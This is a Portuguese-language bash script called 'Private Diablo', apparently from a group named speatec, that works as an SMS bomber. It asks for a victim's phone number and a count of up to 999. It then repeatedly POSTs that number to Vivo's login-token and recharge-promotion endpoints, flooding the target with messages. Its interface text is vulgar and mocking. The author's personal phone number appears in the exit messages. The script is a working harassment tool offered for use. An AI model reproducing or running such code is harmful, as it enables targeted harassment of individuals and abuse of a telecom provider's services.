#!/bin/bash
#Site da speatec: https://equipe-speatec-ofc.blogspot.com/?m=1
#DONO {<MD>}


tit=$"DONO <{MD}>"
tokens=$(echo "93757d08-72e9-4688-bab0-5b8e7b5a63a1
91e22bd5-7b79-4fef-8dfa-c40f1ff3736b
f922b71c-8b48-4363-a9fd-74c0757c161d
6e7eb039-9816-4118-9c3b-bb906887722c
6c360891-8ce5-45ba-a2c3-97e0a7139d99
02f76cd1-eead-44ff-88dd-aa69538c7aef")
veri=$(echo -e "\e[01;37m Opção: \e[0m") # Opção:
veri2=$(echo -e "\e[01;37m Número: \e[0m") # Número:
veri3=$(echo -e "\e[01;37m Vezes: \e[0m") # Vezes:
while :; do
clear && echo -e $tit
  echo -e "\e[01;30;40m
                ______________,ooOOOOOo,
                ___________,oO88*___,oooooooo,,
                _________.,O88*___oO888_____****
                _______.oO88*_oO88*
                ______.oO88*o888*
                _____.oO8oO88*
                _____oOo8888*
                _____OO88888.
                ____MXXXXXXMMx
                ___MX0tttxXXXXXMx   PRIVATE DIABLO
                _.MXXXXXXMXXXXXMMx____________,,xxxxxxx,,
                WMXXXMMXXXXXXXXXXMMMMMmmmMMXXXXXXMM
                _W*M*__*MXXXXXXXXXXXXMMMXXXXMXXXXXXXXXMM
                ________.*MXXXMXXXXXXXMMXXXXMXXXXXXXXXXMM
                _________.*MXMMXXXXXXXXMXXXMXXXXXXXXXXXMMI
                ___________*MMXXXXXXXXXMXXXMXXXXXXXXXXMMI
                ____________*MXXXXXXXXXMXXXXMXXXXXXXXXMM
                _____________*MXXXXXXXXMXXXXXMXXXXXXXMM
                ______________*MXXXXXMMMMMMMMXXXXX*MM
                _______________*XXXXXM_________.MXXXX.*MM
                ________________XXXXM*__________.MXXx.*MMII
                ________________.XXXM*___________.MXXx.*MM
                ________________.XX.M*____________.MXX*.MI
                ________________.XX.M_____________XXX_MI
                ________________.XX.MI____________XXX.MII
                ________________XXI///____________XXII_///
                _______________/////______________//// \e[0m"; sleep .4; echo

  echo -e "\033[1;31m Site da speatec: https://equipe-speatec-ofc.blogspot.com/?m=d1"
  echo -e "                < \e[01;37mOPÇÕES\e[0m >"
  echo -e " [1]\e[0m\e[01;33mBombardeiro\e[0m\c"; echo -e "    \e[02;03;37m bombardia o fdp\e[0m"

    read -n1 -p "$veri" verifica; echo
    case $verifica in # case MENU

           1) while :; do
           clear && echo -e $tit

           echo -e "\e[01;30;47m             Private Diablo         \e[0m"; sleep .4; echo
           echo -e "\e[01;32mBote o DDD+NÚMERO \e[0m"
           while :; do
               read -p "$veri2" NUMERO; sleep .5
                 limite=$(echo $NUMERO | wc -m)
                      case $limite in
                          12) break;;
                           *) echo -e "\e[01;33m AJEITA A PORRA DO NÚMERO, BOTA 11 DIGITOS\e[0m"; sleep .2
                      esac
           done
           echo -e "\e[01;37;44m Quantas vezes vc quer comer o cu dele? \e[0m"
           while :; do
           echo -e '\e[01;37m(1) 100x\c'; echo -e ' | (2) 300x \c'; echo -e '| (3) 500x\c'; echo -e ' | (4) 999x \e[0m'
           read -n1 -p "$veri" xx
              case $xx in
                   1) VEZES=100; echo; echo -e '\e[01;37;41m Ado ado ado, qm ler isso é viadokkkk \e[0m'|pv -qL 30; sleep 0; break;;
                   2) VEZES=300; echo; echo -e '\e[01;37;41m Namora comigo se não vai de spam \e[0m'|pv -qL 25; sleep 1; break;;
                   3) VEZES=500; echo; echo -e '\e[01;37;41m Será que alguém realmente ler isso? \e[0m'|pv -qL 25; sleep 1; break;;
                   4) VEZES=999; echo; echo -e '\e[01;37;41m Agora a cobrar vai fumar!\e[0m'|pv -qL 25; sleep 0; break;;
                   *) echo; echo -e "\e[01;37;41m ESPERA FDP \e[0m"; sleep 1
              esac
           done
           clear && echo -e $tit
           echo -e "\e[01;37;41m             PRIVATE DIABLO             \e[0m"; sleep .4; echo
           echo -e "\e[01;33;44m SEXTOU, VEM XERECA!  \e[0m"|pv -qL 25
           echo -e "\e[07;01;37;40m LIBDGEL \e[01;36;40m $OLHA: \e[0m"
           echo -e "\e[07;01;37;40m NUMERO \e[01;36;40m $NUMERO \e[0m"; sleep .5
           echo
           echo -e "\e[0m\e[01;37;41m KKKKKKKKKKKKKKKKKK \e[0m"
              for i in $(seq $VEZES);
                 do
              response=$(data=$"numero=$NUMERO" && site=$"https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do" && curl -s "$site" -H "User-Agent: Android" -d "$data")
              body=$(echo $response | jq '.code')
                   case $body in
                        101) echo -e "\e[01;33mNÚMERO ERRADO \e[0m\e[01;37mMD NÉ \e[0m"|pv -qL 25; sleep .5; break;;
                          0) echo -e "\e[01;32m VOU CHUPAR SEU TORAX\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 25;;
                          *) echo -e "\e[01;37mPrimeiro você ver e depois cópia \e[0mARTIGO 157\e[0m"; echo $response; break
                   esac
           done; echo
           echo -e "\e[0m\e[01;37;41m VOLTA EX, EU MUDEI \e[0m"
            for i in $(seq $VEZES);
               do
             response=$(site=$"http://portalrecarga.vivo.com.br/lp/login/descontosslidemodalBoticario?offerID=15396&serviceID=30" && curl -s "$site" -d "ddd=&number=$NUMERO&callbackUrl=&eventName=clickconfirmation")
             body=$(echo $response | grep -c form-pincode)
                  case $body in
                       1) echo -e "\e[01;32m TUDO COMEÇOU NO SANTA AMORO\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 3000000;;
                       *) echo -e "Primeiro vc ver e depois cópia \e[0m \e[01;37mARTIGO 157\e[0m"; echo $response; break
      esac
            done; echo
           echo -e "         \e[01;37m O P Ç Õ E S \e[0m"
           echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
           echo -e " \e[01;37m〘*1*〙\e[0m\e[01;33mREPETIR DE NOVO\e[0m\c";
           echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
           echo -e " \e[01;37m『*2*』\e[0m\e[01;33mVOLTAR PARA O MENU\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
           echo -e " \e[01;37m『*0*』\e[0m\e[01;33mCAIR FORA DESSA MERDA ><\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
           echo -e " \e[00;31m═══════════════════════════════\e[0m"
            while :; do
             read -n1 -p "$veri" opc2; echo
                 case $opc2 in
                      1) break;;
                      2) break;;
                      0) rm principal2 > /dev/null 2>&1; echo -e "\e[01;37m<MD> | +5592991536110\e[0m"; echo -e "\e[01;33mPara iniciar novamente digite: ./principal\e[0m"|pv -qL 20; exit;;
                      *) echo -e "\e[01;37;41m ESPERA! \e[0m"; sleep 1
                 esac
            done
                 case $opc2 in
                      2) break
                 esac
           done;;
9) tail -n +120 principal > principal1 && head -n +28 principal1 > principal2 && rm principal1 && chmod +x principal2 && break;;
       0) rm principal2 > /dev/null 2>&1; echo -e "\e[01;37m•MD• | +5592991536110\e[0m"; echo -e "\e[01;33mPara iniciar novamente digite: ./principal\e[0m"|pv -qL 20; break;;
       *) echo -e "\e[01;37;41m CALMA MOXIN<3 \e[0m"; sleep 1
    esac # case MENU
done # primeiro loop
case $verifica in
     9) ./principal2;;
     0) exit
esac
